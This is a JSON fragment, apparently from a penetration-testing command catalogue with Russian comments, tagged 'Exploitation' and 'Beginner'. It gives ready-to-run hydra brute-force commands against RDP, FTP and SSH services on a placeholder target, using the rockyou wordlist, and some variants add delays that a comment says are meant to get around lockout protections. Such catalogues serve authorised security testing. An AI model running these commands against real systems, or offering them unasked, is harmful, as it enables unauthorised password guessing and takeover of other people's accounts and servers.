    "commands": {
      "CVE-GENERIC-BRUTEFORCE-RDP": [
        "# Brute Force RDP (порт 3389)",
        "hydra -l administrator -P /usr/share/wordlists/rockyou.txt rdp://<TARGET_IP>",
        "",
        "# Со списком логинов",
        "hydra -L users.txt -P passwords.txt rdp://<TARGET_IP>:3389"
      ],
      "CVE-GENERIC-BRUTEFORCE-FTP": [
        "# Brute Force FTP (порт 21)",
        "hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://<TARGET_IP>",
        "",
        "# С задержкой между попытками",
        "hydra -l admin -P passwords.txt -t 4 -W 3 ftp://<TARGET_IP>"
      ],
      "CVE-GENERIC-BRUTEFORCE-SSH": [
        "# Brute Force SSH (порт 22)",
        "hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://<TARGET_IP>",
        "",
        "# С задержкой для обхода блокировки",
        "hydra -l admin -P passwords.txt -t 4 -W 5 ssh://<TARGET_IP>"
      ]
    },
    "phases": ["Exploitation"],
    "skill_level": "Beginner",
    "os": ["Linux"]
  },
